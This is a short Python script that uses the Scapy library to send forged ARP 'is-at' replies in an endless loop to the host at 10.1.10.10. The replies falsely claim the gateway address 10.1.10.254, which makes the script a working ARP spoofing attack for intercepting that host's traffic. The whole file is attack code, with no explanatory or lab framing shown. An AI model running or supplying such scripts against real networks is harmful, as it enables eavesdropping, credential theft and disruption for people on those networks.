from scapy.all import *


sendp( Ether(dst="08:00:27:1f:68:f6")/ARP(op="is-at", psrc="10.1.10.254", pdst="10.1.10.10"), inter=2, loop=1 )